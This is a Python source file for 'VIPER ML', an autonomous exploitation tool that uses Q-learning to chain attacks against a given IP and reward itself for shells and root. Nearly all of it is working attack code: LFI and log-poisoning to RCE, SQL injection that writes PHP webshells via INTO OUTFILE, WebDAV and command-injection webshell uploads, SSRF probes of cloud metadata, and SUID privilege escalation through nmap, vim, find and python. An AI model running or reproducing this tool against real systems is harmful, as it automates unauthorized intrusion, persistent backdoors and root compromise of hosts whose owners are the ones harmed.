#!/usr/bin/env python3
"""
VIPER ML - Machine Learning Enhanced Exploitation Engine

Uses Q-Learning to learn optimal attack chains:
- State: Current access level, discovered vulns, failed attempts
- Actions: Exploit techniques (LFI, SQLi, WebDAV, etc.)
- Rewards: +100 root, +50 shell, +10 vuln found, -5 failed attempt

The more VIPER hunts, the smarter it gets.
"""

import asyncio
import aiohttp
import base64
import json
import numpy as np
import pickle
import random
import re
import urllib.parse
from datetime import datetime
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from enum import Enum
import logging

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("VIPER-ML")

# Paths
HACKAGENT_DIR = Path(__file__).parent
REPORTS_DIR = HACKAGENT_DIR / "reports"
MODELS_DIR = HACKAGENT_DIR / "models"
REPORTS_DIR.mkdir(exist_ok=True)
MODELS_DIR.mkdir(exist_ok=True)

Q_TABLE_PATH = MODELS_DIR / "viper_qtable.pkl"
EXPERIENCE_PATH = MODELS_DIR / "viper_experience.json"


# ==================== STATE & ACTION SPACE ====================

class AccessLevel(Enum):
    NONE = 0
    WEB = 1      # Can make HTTP requests
    LFI = 2      # Can read local files
    SHELL = 3    # Command execution
    ROOT = 4     # Root access


class Action(Enum):
    # Recon
    SCAN_PORTS = "scan_ports"
    FINGERPRINT = "fingerprint"
    ENUMERATE_DIRS = "enumerate_dirs"
    
    # Vuln Discovery
    TEST_LFI = "test_lfi"
    TEST_SQLI = "test_sqli"
    TEST_XSS = "test_xss"
    TEST_WEBDAV = "test_webdav"
    TEST_RFI = "test_rfi"
    TEST_CMDI = "test_cmdi"
    
    # More Discovery
    TEST_SSTI = "test_ssti"
    TEST_SSRF = "test_ssrf"

    # Exploitation
    EXPLOIT_LFI = "exploit_lfi"
    EXPLOIT_SQLI = "exploit_sqli"
    EXPLOIT_WEBDAV = "exploit_webdav"
    EXPLOIT_RFI = "exploit_rfi"
    EXPLOIT_CMDI = "exploit_cmdi"
    
    # Privesc
    FIND_SUID = "find_suid"
    EXPLOIT_SUID_NMAP = "exploit_suid_nmap"
    EXPLOIT_SUID_VIM = "exploit_suid_vim"
    EXPLOIT_SUID_FIND = "exploit_suid_find"
    EXPLOIT_SUID_PYTHON = "exploit_suid_python"
    CHECK_SUDO = "check_sudo"
    KERNEL_EXPLOIT = "kernel_exploit"


@dataclass
class State:
    """Represents current attack state"""
    access_level: AccessLevel = AccessLevel.NONE
    vulns_found: List[str] = field(default_factory=list)
    shell_user: str = ""
    shell_url: str = ""
    suid_binaries: List[str] = field(default_factory=list)
    failed_actions: List[str] = field(default_factory=list)
    
    def to_vector(self) -> Tuple:
        """Convert state to hashable tuple for Q-table"""
        return (
            self.access_level.value,
            tuple(sorted(self.vulns_found)),
            self.shell_user,
            tuple(sorted(self.suid_binaries)),
            len(self.failed_actions)
        )


# ==================== Q-LEARNING AGENT ====================

class QLearningAgent:
    """
    Q-Learning agent for attack chain optimization.
    
    Learns which actions work best in which states.
    """
    
    def __init__(self, learning_rate=0.3, discount_factor=0.95, epsilon=0.1):
        self.lr = learning_rate
        self.gamma = discount_factor
        self.epsilon = epsilon  # Exploration rate (lower = exploit more)
        self.q_table: Dict[Tuple, Dict[str, float]] = {}
        self.experience: List[Dict] = []
        
        # Load existing model
        self.load()
    
    def get_q_value(self, state: State, action: Action) -> float:
        """Get Q-value for state-action pair"""
        state_key = state.to_vector()
        if state_key not in self.q_table:
            self.q_table[state_key] = {}
        return self.q_table[state_key].get(action.value, 0.0)
    
    def choose_action(self, state: State, valid_actions: List[Action]) -> Action:
        """Choose action using epsilon-greedy policy"""
        if random.random() < self.epsilon:
            # Explore: random action
            return random.choice(valid_actions)
        else:
            # Exploit: best known action
            q_values = [(a, self.get_q_value(state, a)) for a in valid_actions]
            q_values.sort(key=lambda x: x[1], reverse=True)
            return q_values[0][0]
    
    def update(self, state: State, action: Action, reward: float, next_state: State, done: bool):
        """Update Q-value based on experience"""
        state_key = state.to_vector()
        if state_key not in self.q_table:
            self.q_table[state_key] = {}
        
        current_q = self.get_q_value(state, action)
        
        if done:
            target = reward
        else:
            # Get max Q-value for next state
            next_state_key = next_state.to_vector()
            if next_state_key in self.q_table:
                max_next_q = max(self.q_table[next_state_key].values()) if self.q_table[next_state_key] else 0
            else:
                max_next_q = 0
            target = reward + self.gamma * max_next_q
        
        # Q-learning update
        self.q_table[state_key][action.value] = current_q + self.lr * (target - current_q)
        
        # Store experience
        self.experience.append({
            "timestamp": datetime.now().isoformat(),
            "state": str(state_key),
            "action": action.value,
            "reward": reward,
            "done": done
        })
    
    def save(self):
        """Save Q-table and experience"""
        with open(Q_TABLE_PATH, 'wb') as f:
            pickle.dump(self.q_table, f)
        
        # Keep last 10000 experiences
        recent = self.experience[-10000:]
        with open(EXPERIENCE_PATH, 'w') as f:
            json.dump(recent, f, indent=2)
        
        log.info(f"Model saved: {len(self.q_table)} states, {len(self.experience)} experiences")
    
    def load(self):
        """Load existing Q-table and experience"""
        if Q_TABLE_PATH.exists():
            with open(Q_TABLE_PATH, 'rb') as f:
                self.q_table = pickle.load(f)
            log.info(f"Loaded Q-table: {len(self.q_table)} states")
        
        if EXPERIENCE_PATH.exists():
            with open(EXPERIENCE_PATH, 'r') as f:
                self.experience = json.load(f)
            log.info(f"Loaded experience: {len(self.experience)} records")
    
    def get_stats(self) -> Dict:
        """Get learning statistics"""
        return {
            "states_learned": len(self.q_table),
            "total_experiences": len(self.experience),
            "exploration_rate": self.epsilon,
            "avg_q_value": np.mean([
                v for state_actions in self.q_table.values() 
                for v in state_actions.values()
            ]) if self.q_table else 0
        }


# ==================== VIPER ML ENGINE ====================

class ViperML:
    """
    ML-Enhanced VIPER Exploitation Engine
    
    Uses Q-Learning to learn optimal attack strategies.
    Gets smarter with every engagement.
    """
    
    def __init__(self):
        self.agent = QLearningAgent()
        self.state = State()
        self.target_ip = ""
        self.target_port = 80
        self.base_url = ""
        self.session: Optional[aiohttp.ClientSession] = None
        self.events: List[str] = []
        self.start_time = None
        
    def log(self, msg: str, level: str = "INFO"):
        self.events.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        if level == "SUCCESS":
            log.info(f"[+] {msg}")
        elif level == "VULN":
            log.warning(f"[!] {msg}")
        elif level == "SHELL":
            log.info(f"[SHELL] {msg}")
        elif level == "ROOT":
            log.info(f"[ROOT] {msg}")
        elif level == "ML":
            log.info(f"[ML] {msg}")
        else:
            log.info(msg)
    
    async def request(self, url: str, method: str = "GET", data: str = None,
                      timeout: int = 10) -> Tuple[int, str, dict]:
        try:
            async with self.session.request(
                method, url, data=data,
                timeout=aiohttp.ClientTimeout(total=timeout),
                ssl=False
            ) as resp:
                body = await resp.text()
                return resp.status, body, dict(resp.headers)
        except Exception as e:
            return 0, str(e), {}
    
    def get_valid_actions(self) -> List[Action]:
        """Get valid actions based on current state - prioritize exploitation"""
        actions = []
        
        if self.state.access_level == AccessLevel.NONE:
            actions = [Action.SCAN_PORTS, Action.FINGERPRINT]
        
        elif self.state.access_level == AccessLevel.WEB:
            # PRIORITY: If we have exploitable vulns, exploit them first!
            if "webdav" in self.state.vulns_found:
                return [Action.EXPLOIT_WEBDAV]  # Force exploitation
            if "cmdi" in self.state.vulns_found:
                return [Action.EXPLOIT_CMDI]  # Command injection → direct shell
            if "sqli" in self.state.vulns_found and "webdav" not in self.state.vulns_found:
                actions = [Action.EXPLOIT_SQLI, Action.TEST_WEBDAV]
            if "lfi" in self.state.vulns_found and "sqli" not in self.state.vulns_found:
                actions = [Action.EXPLOIT_LFI, Action.TEST_SQLI, Action.TEST_WEBDAV]
            if "rfi" in self.state.vulns_found:
                actions = [Action.EXPLOIT_RFI, Action.TEST_WEBDAV]
            
            # If no vulns yet, test for them
            if not self.state.vulns_found:
                actions = [
                    Action.TEST_WEBDAV,  # Check WebDAV first - easy shell
                    Action.TEST_SQLI,
                    Action.TEST_LFI,
                    Action.TEST_XSS,
                    Action.TEST_CMDI,
                    Action.TEST_SSTI,
                    Action.ENUMERATE_DIRS
                ]
            elif not actions:
                actions = [
                    Action.TEST_WEBDAV,
                    Action.TEST_SQLI,
                    Action.TEST_LFI,
                    Action.TEST_CMDI,
                    Action.TEST_RFI,
                    Action.TEST_XSS,
                    Action.TEST_SSTI,
                    Action.TEST_SSRF,
                ]
        
        elif self.state.access_level == AccessLevel.SHELL:
            # PRIORITY: If we found SUID binaries, exploit them immediately!
            if "/usr/bin/nmap" in self.state.suid_binaries:
                return [Action.EXPLOIT_SUID_NMAP]  # Force nmap exploit
            if "/usr/bin/vim" in self.state.suid_binaries:
                return [Action.EXPLOIT_SUID_VIM]
            if "/usr/bin/find" in self.state.suid_binaries:
                return [Action.EXPLOIT_SUID_FIND]
            if "/usr/bin/python" in self.state.suid_binaries:
                return [Action.EXPLOIT_SUID_PYTHON]
            
            # Otherwise enumerate for privesc vectors
            actions = [Action.FIND_SUID, Action.CHECK_SUDO]
        
        # Filter out failed actions (don't repeat failures)
        actions = [a for a in actions if a.value not in self.state.failed_actions[-5:]]
        
        return actions if actions else [Action.FINGERPRINT]  # Fallback
    
    async def execute_action(self, action: Action) -> Tuple[float, bool]:
        """
        Execute action and return (reward, done).
        
        Rewards:
        - +100: Got root
        - +50: Got shell
        - +10: Found vulnerability
        - +5: Successful recon
        - -5: Failed attempt
        - -1: No progress
        """
        reward = -1  # Default: no progress
        done = False
        
        self.log(f"Executing: {action.value}", "ML")
        
        try:
            if action == Action.SCAN_PORTS:
                reward = await self._scan_ports()
            
            elif action == Action.FINGERPRINT:
                reward = await self._fingerprint()
            
            elif action == Action.ENUMERATE_DIRS:
                reward = await self._enumerate_dirs()
            
            elif action == Action.TEST_LFI:
                reward = await self._test_lfi()
            
            elif action == Action.TEST_SQLI:
                reward = await self._test_sqli()
            
            elif action == Action.TEST_WEBDAV:
                reward = await self._test_webdav()
            
            elif action == Action.TEST_XSS:
                reward = await self._test_xss()

            elif action == Action.TEST_CMDI:
                reward = await self._test_cmdi()

            elif action == Action.TEST_RFI:
                reward = await self._test_rfi()

            elif action == Action.TEST_SSTI:
                reward = await self._test_ssti()

            elif action == Action.TEST_SSRF:
                reward = await self._test_ssrf()

            elif action == Action.EXPLOIT_CMDI:
                reward = await self._exploit_cmdi()
                if self.state.access_level == AccessLevel.SHELL:
                    reward = 50

            elif action == Action.EXPLOIT_WEBDAV:
                reward = await self._exploit_webdav()
                if self.state.access_level == AccessLevel.SHELL:
                    reward = 50
            
            elif action == Action.EXPLOIT_LFI:
                reward = await self._exploit_lfi()
            
            elif action == Action.EXPLOIT_SQLI:
                reward = await self._exploit_sqli()
            
            elif action == Action.FIND_SUID:
                reward = await self._find_suid()
            
            elif action == Action.EXPLOIT_SUID_NMAP:
                reward = await self._exploit_suid_nmap()
                if self.state.access_level == AccessLevel.ROOT:
                    reward = 100
                    done = True
            
            elif action == Action.EXPLOIT_SUID_VIM:
                reward = await self._exploit_suid_vim()
                if self.state.access_level == AccessLevel.ROOT:
                    reward = 100
                    done = True

            elif action == Action.EXPLOIT_SUID_FIND:
                reward = await self._exploit_suid_find()
                if self.state.access_level == AccessLevel.ROOT:
                    reward = 100
                    done = True

            elif action == Action.EXPLOIT_SUID_PYTHON:
                reward = await self._exploit_suid_python()
                if self.state.access_level == AccessLevel.ROOT:
                    reward = 100
                    done = True

            elif action == Action.CHECK_SUDO:
                reward = await self._check_sudo()
            
        except Exception as e:
            self.log(f"Action failed: {e}")
            reward = -5
            self.state.failed_actions.append(action.value)
        
        if reward < 0:
            self.state.failed_actions.append(action.value)
        
        return reward, done
    
    # ==================== ACTION IMPLEMENTATIONS ====================
    
    async def _scan_ports(self) -> float:
        """Scan common ports"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 1433, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 8888, 9200, 27017]
        open_ports = []
        
        for port in common_ports:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_ip, port),
                    timeout=1.0
                )
                open_ports.append(port)
                writer.close()
                await writer.wait_closed()
            except:
                pass
        
        if open_ports:
            self.log(f"Open ports: {open_ports}")
            self.state.access_level = AccessLevel.WEB
            return 5
        return -1
    
    async def _fingerprint(self) -> float:
        """Fingerprint web server"""
        status, body, headers = await self.request(self.base_url)
        if status == 200:
            server = headers.get('Server', '')
            self.log(f"Server: {server}")
            self.state.access_level = AccessLevel.WEB
            return 5
        return -1
    
    async def _enumerate_dirs(self) -> float:
        """Enumerate directories"""
        paths = ["/admin", "/phpmyadmin/", "/dvwa/", "/mutillidae/", "/dav/", "/phpinfo.php"]
        found = 0
        
        for path in paths:
            status, body, _ = await self.request(f"{self.base_url}{path}")
            if status in [200, 301, 302]:
                self.log(f"Found: {path}")
                found += 1
        
        return 5 if found > 0 else -1
    
    async def _test_lfi(self) -> float:
        """Test for LFI"""
        endpoints = [
            "/mutillidae/index.php?page=",
            "/index.php?page=",
            "/index.php?file="
        ]
        
        payload = "php://filter/convert.base64-encode/resource=/etc/passwd"
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}{urllib.parse.quote(payload)}"
            status, body, _ = await self.request(url)
            
            match = re.search(r'[A-Za-z0-9+/]{100,}={0,2}', body)
            if match:
                try:
                    decoded = base64.b64decode(match.group()).decode('utf-8', errors='ignore')
                    if 'root:x:0:0' in decoded:
                        self.log(f"LFI found at {endpoint}", "VULN")
                        self.state.vulns_found.append("lfi")
                        return 10
                except:
                    pass
        return -5
    
    async def _test_sqli(self) -> float:
        """Test for SQL injection"""
        url = f"{self.base_url}/mutillidae/index.php?page=user-info.php&username='&password=x"
        status, body, _ = await self.request(url)
        
        if any(x in body.lower() for x in ['sql', 'mysql', 'syntax', 'error']):
            self.log("SQLi found", "VULN")
            self.state.vulns_found.append("sqli")
            return 10
        return -5
    
    async def _test_ssti(self) -> float:
        """Test for Server-Side Template Injection"""
        endpoints = [
            "/index.php?name=",
            "/search?q=",
            "/profile?username=",
            "/render?template=",
        ]
        payloads = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("{{config}}", "SECRET"),
            ("#{7*7}", "49"),
        ]
        for endpoint in endpoints:
            for payload, marker in payloads:
                url = f"{self.base_url}{endpoint}{urllib.parse.quote(payload)}"
                status, body, _ = await self.request(url)
                if marker in body and payload not in body:
                    self.log(f"SSTI found at {endpoint} with {payload}", "VULN")
                    self.state.vulns_found.append("ssti")
                    return 10
        return -5

    async def _test_ssrf(self) -> float:
        """Test for Server-Side Request Forgery"""
        endpoints = [
            "/fetch?url=",
            "/proxy?url=",
            "/load?url=",
            "/index.php?url=",
            "/api/fetch?target=",
        ]
        # Test with internal metadata endpoints and localhost
        payloads = [
            ("http://127.0.0.1:22", "SSH"),
            ("http://localhost/server-status", "Apache"),
            ("http://169.254.169.254/latest/meta-data/", "ami-id"),
            ("file:///etc/passwd", "root:"),
            ("http://[::1]/", "html"),
        ]
        for endpoint in endpoints:
            for payload, marker in payloads:
                url = f"{self.base_url}{endpoint}{urllib.parse.quote(payload)}"
                status, body, _ = await self.request(url)
                if marker.lower() in body.lower() and status in [200, 301, 302]:
                    self.log(f"SSRF found at {endpoint}", "VULN")
                    self.state.vulns_found.append("ssrf")
                    return 10
        return -5

    async def _test_webdav(self) -> float:
        """Test WebDAV write access"""
        test_file = f"test_{int(datetime.now().timestamp())}.txt"
        test_content = "viper_test"
        
        async with self.session.put(
            f"{self.base_url}/dav/{test_file}",
            data=test_content,
            timeout=aiohttp.ClientTimeout(total=10)
        ) as resp:
            if resp.status in [200, 201, 204]:
                self.log("WebDAV write enabled", "VULN")
                self.state.vulns_found.append("webdav")
                return 10
        return -5
    
    async def _exploit_webdav(self) -> float:
        """Upload shell via WebDAV"""
        shell_code = '<?php echo shell_exec($_GET["c"]); ?>'
        shell_name = f"viper_{int(datetime.now().timestamp())}.php"
        
        async with self.session.put(
            f"{self.base_url}/dav/{shell_name}",
            data=shell_code,
            timeout=aiohttp.ClientTimeout(total=10)
        ) as resp:
            if resp.status in [200, 201, 204]:
                # Test shell
                shell_url = f"{self.base_url}/dav/{shell_name}"
                status, body, _ = await self.request(f"{shell_url}?c=id")
                
                if 'uid=' in body:
                    match = re.search(r'uid=(\d+)\(([^)]+)\)', body)
                    if match:
                        self.state.access_level = AccessLevel.SHELL
                        self.state.shell_user = match.group(2)
                        self.state.shell_url = shell_url
                        self.log(f"Got shell as {self.state.shell_user}!", "SHELL")
                        return 50
        return -5
    
    async def _test_xss(self) -> float:
        """Test for reflected XSS"""
        endpoints = [
            "/index.php?name=",
            "/search?q=",
            "/dvwa/vulnerabilities/xss_r/?name=",
            "/mutillidae/index.php?page=dns-lookup.php&target_host=",
        ]
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'\"><svg/onload=alert(1)>",
        ]
        for endpoint in endpoints:
            for payload in payloads:
                url = f"{self.base_url}{endpoint}{urllib.parse.quote(payload)}"
                status, body, _ = await self.request(url)
                if payload in body or payload.replace('"', '&quot;') in body:
                    self.log(f"XSS found at {endpoint}", "VULN")
                    self.state.vulns_found.append("xss")
                    return 10
        return -5

    async def _test_cmdi(self) -> float:
        """Test for command injection"""
        endpoints = [
            "/mutillidae/index.php?page=dns-lookup.php&target_host=",
            "/index.php?cmd=",
            "/ping?host=",
        ]
        payloads = [
            (";id", "uid="),
            ("|id", "uid="),
            ("$(id)", "uid="),
            ("`id`", "uid="),
        ]
        for endpoint in endpoints:
            for payload, marker in payloads:
                url = f"{self.base_url}{endpoint}{urllib.parse.quote(payload)}"
                status, body, _ = await self.request(url)
                if marker in body:
                    self.log(f"Command injection found at {endpoint}", "VULN")
                    self.state.vulns_found.append("cmdi")
                    return 10
        return -5

    async def _test_rfi(self) -> float:
        """Test for Remote File Inclusion"""
        endpoints = [
            "/mutillidae/index.php?page=",
            "/index.php?file=",
            "/index.php?include=",
        ]
        # Use data:// wrapper as a safe RFI test (no external server needed)
        payloads = [
            ("data://text/plain;base64,PD9waHAgZWNobyAndmlwZXJfcmZpX3Rlc3QnOyA/Pg==", "viper_rfi_test"),
            ("data://text/plain,<?php echo 'viper_rfi_ok'; ?>", "viper_rfi_ok"),
        ]
        for endpoint in endpoints:
            for payload, marker in payloads:
                url = f"{self.base_url}{endpoint}{urllib.parse.quote(payload)}"
                status, body, _ = await self.request(url)
                if marker in body:
                    self.log(f"RFI found at {endpoint}", "VULN")
                    self.state.vulns_found.append("rfi")
                    return 10
        return -5

    async def _exploit_lfi(self) -> float:
        """Turn LFI into RCE via data:// wrapper or log poisoning"""
        if not self.state.shell_url and "lfi" not in self.state.vulns_found:
            return -5

        endpoints = [
            "/mutillidae/index.php?page=",
            "/index.php?page=",
            "/index.php?file=",
        ]

        # Strategy 1: data:// wrapper for direct code execution
        rce_payload = "data://text/plain,<?php echo shell_exec($_GET['c']); ?>"
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}{urllib.parse.quote(rce_payload)}&c=id"
            status, body, _ = await self.request(url)
            if 'uid=' in body:
                match = re.search(r'uid=(\d+)\(([^)]+)\)', body)
                if match:
                    # Build a reusable shell URL
                    shell_url = f"{self.base_url}{endpoint}{urllib.parse.quote(rce_payload)}"
                    self.state.access_level = AccessLevel.SHELL
                    self.state.shell_user = match.group(2)
                    self.state.shell_url = shell_url
                    self.log(f"LFI→RCE via data:// as {self.state.shell_user}!", "SHELL")
                    return 50

        # Strategy 2: Log poisoning via User-Agent injection
        log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/httpd/access_log",
            "/var/log/nginx/access.log",
        ]
        poison_ua = "<?php echo shell_exec($_GET['c']); ?>"
        # First, send a request with poisoned User-Agent
        try:
            async with self.session.get(
                self.base_url,
                headers={"User-Agent": poison_ua},
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False
            ) as _:
                pass
        except Exception:
            pass

        # Then try to include the log file
        for endpoint in endpoints:
            for log_path in log_paths:
                traversal = "....//....//....//....//..../" + log_path.lstrip("/")
                url = f"{self.base_url}{endpoint}{urllib.parse.quote(traversal)}&c=id"
                status, body, _ = await self.request(url)
                if 'uid=' in body:
                    match = re.search(r'uid=(\d+)\(([^)]+)\)', body)
                    if match:
                        shell_url = f"{self.base_url}{endpoint}{urllib.parse.quote(traversal)}"
                        self.state.access_level = AccessLevel.SHELL
                        self.state.shell_user = match.group(2)
                        self.state.shell_url = shell_url
                        self.log(f"LFI→RCE via log poisoning as {self.state.shell_user}!", "SHELL")
                        return 50
        return -5

    async def _exploit_sqli(self) -> float:
        """Exploit SQL injection for data extraction or shell"""
        # Strategy 1: UNION-based extraction of credentials
        union_payloads = [
            "' UNION SELECT user(),database(),version()-- -",
            "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -",
            "' UNION SELECT username,password,NULL FROM users-- -",
            "1' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- -",
        ]
        test_url_base = f"{self.base_url}/mutillidae/index.php?page=user-info.php&username="
        for payload in union_payloads:
            url = f"{test_url_base}{urllib.parse.quote(payload)}&password=x"
            status, body, _ = await self.request(url)
            if 'root:x:0:0' in body or 'root:' in body:
                self.log("SQLi file read achieved (LOAD_FILE)", "VULN")
                self.state.vulns_found.append("sqli_file_read")
                return 15
            if any(x in body.lower() for x in ['information_schema', 'table_name']):
                self.log("SQLi UNION extraction working", "VULN")
                return 10

        # Strategy 2: INTO OUTFILE for webshell
        shell_code = "<?php echo shell_exec($_GET['c']); ?>"
        outfile_payloads = [
            f"' UNION SELECT '{shell_code}',NULL,NULL INTO OUTFILE '/var/www/html/viper_sqli.php'-- -",
            f"' UNION SELECT '{shell_code}',NULL,NULL INTO OUTFILE '/var/www/viper_sqli.php'-- -",
        ]
        for payload in outfile_payloads:
            url = f"{test_url_base}{urllib.parse.quote(payload)}&password=x"
            await self.request(url)
            # Check if shell was written
            for shell_path in ["/viper_sqli.php"]:
                shell_url = f"{self.base_url}{shell_path}?c=id"
                status, body, _ = await self.request(shell_url)
                if 'uid=' in body:
                    match = re.search(r'uid=(\d+)\(([^)]+)\)', body)
                    if match:
                        self.state.access_level = AccessLevel.SHELL
                        self.state.shell_user = match.group(2)
                        self.state.shell_url = f"{self.base_url}{shell_path}"
                        self.log(f"SQLi→RCE via INTO OUTFILE as {self.state.shell_user}!", "SHELL")
                        return 50
        return -5
    
    async def _find_suid(self) -> float:
        """Find SUID binaries for privesc"""
        if not self.state.shell_url:
            return -5
        
        cmd = "find / -perm -4000 -type f 2>/dev/null"
        url = f"{self.state.shell_url}?c={urllib.parse.quote(cmd)}"
        status, body, _ = await self.request(url, timeout=30)
        
        suid_targets = ["/usr/bin/nmap", "/usr/bin/vim", "/usr/bin/find", "/usr/bin/python"]
        found = []
        
        for binary in suid_targets:
            if binary in body:
                found.append(binary)
                self.log(f"SUID found: {binary}", "VULN")
        
        self.state.suid_binaries = found
        return 10 if found else -1
    
    async def _exploit_suid_nmap(self) -> float:
        """Privesc via nmap SUID"""
        if not self.state.shell_url:
            return -5
        
        cmd = 'echo "!id" | nmap --interactive 2>&1'
        url = f"{self.state.shell_url}?c={urllib.parse.quote(cmd)}"
        status, body, _ = await self.request(url)
        
        if 'euid=0' in body or 'uid=0' in body:
            self.state.access_level = AccessLevel.ROOT
            self.log("GOT ROOT via nmap!", "ROOT")
            return 100
        return -5
    
    async def _exploit_suid_vim(self) -> float:
        """Privesc via vim SUID - use -c flag for non-interactive execution"""
        if not self.state.shell_url:
            return -5
        # vim -c '!command' -c 'qa!' runs a command non-interactively
        cmd = "vim -c '!id > /tmp/viper_vim_out' -c 'qa!' 2>/dev/null; cat /tmp/viper_vim_out"
        url = f"{self.state.shell_url}?c={urllib.parse.quote(cmd)}"
        status, body, _ = await self.request(url, timeout=15)
        if 'euid=0' in body or 'uid=0' in body:
            self.state.access_level = AccessLevel.ROOT
            self.log("GOT ROOT via vim SUID!", "ROOT")
            return 100
        return -5

    async def _exploit_suid_find(self) -> float:
        """Privesc via find SUID"""
        if not self.state.shell_url:
            return -5
        cmd = "find /tmp -maxdepth 0 -exec id \\;"
        url = f"{self.state.shell_url}?c={urllib.parse.quote(cmd)}"
        status, body, _ = await self.request(url)
        if 'euid=0' in body or 'uid=0' in body:
            self.state.access_level = AccessLevel.ROOT
            self.log("GOT ROOT via find SUID!", "ROOT")
            return 100
        return -5

    async def _exploit_suid_python(self) -> float:
        """Privesc via python SUID"""
        if not self.state.shell_url:
            return -5
        cmd = "python -c 'import os; os.setuid(0); os.system(\"id\")'"
        url = f"{self.state.shell_url}?c={urllib.parse.quote(cmd)}"
        status, body, _ = await self.request(url)
        if 'euid=0' in body or 'uid=0' in body:
            self.state.access_level = AccessLevel.ROOT
            self.log("GOT ROOT via python SUID!", "ROOT")
            return 100
        # Try python3
        cmd3 = "python3 -c 'import os; os.setuid(0); os.system(\"id\")'"
        url3 = f"{self.state.shell_url}?c={urllib.parse.quote(cmd3)}"
        status, body, _ = await self.request(url3)
        if 'euid=0' in body or 'uid=0' in body:
            self.state.access_level = AccessLevel.ROOT
            self.log("GOT ROOT via python3 SUID!", "ROOT")
            return 100
        return -5

    async def _exploit_cmdi(self) -> float:
        """Exploit confirmed command injection for shell"""
        if "cmdi" not in self.state.vulns_found:
            return -5
        endpoints = [
            "/mutillidae/index.php?page=dns-lookup.php&target_host=",
            "/index.php?cmd=",
            "/ping?host=",
        ]
        # Try writing a persistent webshell
        shell_code = "<?php echo shell_exec($_GET['c']); ?>"
        write_payloads = [
            f";echo '{shell_code}' > /var/www/html/viper_cmd.php",
            f"|echo '{shell_code}' > /var/www/html/viper_cmd.php",
        ]
        for endpoint in endpoints:
            for payload in write_payloads:
                url = f"{self.base_url}{endpoint}{urllib.parse.quote(payload)}"
                await self.request(url)
            # Check if shell landed
            shell_url = f"{self.base_url}/viper_cmd.php?c=id"
            status, body, _ = await self.request(shell_url)
            if 'uid=' in body:
                match = re.search(r'uid=(\d+)\(([^)]+)\)', body)
                if match:
                    self.state.access_level = AccessLevel.SHELL
                    self.state.shell_user = match.group(2)
                    self.state.shell_url = f"{self.base_url}/viper_cmd.php"
                    self.log(f"CMDi→Shell as {self.state.shell_user}!", "SHELL")
                    return 50
        return -5

    async def _check_sudo(self) -> float:
        """Check sudo permissions"""
        if not self.state.shell_url:
            return -5
        
        cmd = "sudo -l 2>/dev/null"
        url = f"{self.state.shell_url}?c={urllib.parse.quote(cmd)}"
        status, body, _ = await self.request(url)
        
        if "NOPASSWD" in body:
            self.log("NOPASSWD sudo found!", "VULN")
            return 10
        return -1
    
    # ==================== MAIN LOOP ====================
    
    async def pwn(self, ip: str, port: int = 80, max_steps: int = 50):
        """
        ML-driven autonomous exploitation.
        
        The agent chooses actions, learns from results, gets smarter.
        """
        self.start_time = datetime.now()
        self.target_ip = ip
        self.target_port = port
        self.base_url = f"http://{ip}:{port}"
        self.state = State()
        
        self.log(f"VIPER-ML starting against {self.base_url}")
        self.log(f"ML Stats: {self.agent.get_stats()}", "ML")
        
        total_reward = 0
        
        async with aiohttp.ClientSession() as self.session:
            for step in range(max_steps):
                # Get valid actions for current state
                valid_actions = self.get_valid_actions()
                
                # ML agent chooses action
                old_state = State(
                    access_level=self.state.access_level,
                    vulns_found=self.state.vulns_found.copy(),
                    shell_user=self.state.shell_user,
                    suid_binaries=self.state.suid_binaries.copy(),
                    failed_actions=self.state.failed_actions.copy()
                )
                
                action = self.agent.choose_action(old_state, valid_actions)
                
                # Execute action
                reward, done = await self.execute_action(action)
                total_reward += reward
                
                # Update Q-table
                self.agent.update(old_state, action, reward, self.state, done)
                
                self.log(f"Step {step+1}: {action.value} -> reward={reward}, total={total_reward}")
                
                if done:
                    self.log(f"TARGET PWNED in {step+1} steps!", "ROOT")
                    break
                
                if self.state.access_level == AccessLevel.ROOT:
                    break
            
            # Save learned model
            self.agent.save()
            
            # Generate report
            elapsed = (datetime.now() - self.start_time).total_seconds()
            report = self._generate_report(elapsed, total_reward)
            
            report_file = REPORTS_DIR / f"{ip.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_ml.md"
            report_file.write_text(report, encoding='utf-8')
            self.log(f"Report saved: {report_file}")
            
            return self.state.access_level == AccessLevel.ROOT
    
    def _generate_report(self, elapsed: float, total_reward: float) -> str:
        return f"""# VIPER-ML Autonomous Pentest Report
## Target: {self.target_ip}:{self.target_port}
## Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

---

## Results

| Metric | Value |
|--------|-------|
| Duration | {elapsed:.1f}s |
| Final Access | {self.state.access_level.name} |
| Total Reward | {total_reward} |
| Vulns Found | {len(self.state.vulns_found)} |
| Root | {'YES' if self.state.access_level == AccessLevel.ROOT else 'NO'} |

## ML Statistics

{json.dumps(self.agent.get_stats(), indent=2)}

## Attack Log

{''.join(f'{e}' + chr(10) for e in self.events)}

## Vulnerabilities

{', '.join(self.state.vulns_found) or 'None'}

## Shell

- URL: {self.state.shell_url or 'N/A'}
- User: {self.state.shell_user or 'N/A'}

---

*VIPER-ML - Learning to hack, one target at a time*
"""


async def main():
    import sys
    
    if len(sys.argv) < 2:
        print("VIPER-ML - Machine Learning Exploitation Engine")
        print("Usage: python viper_ml.py <target_ip> [port]")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    
    viper = ViperML()
    success = await viper.pwn(ip, port)
    
    print("\n" + "="*60)
    if success:
        print("TARGET PWNED - ROOT ACCESS")
    else:
        print(f"Final access: {viper.state.access_level.name}")
    print("="*60)


if __name__ == "__main__":
    asyncio.run(main())
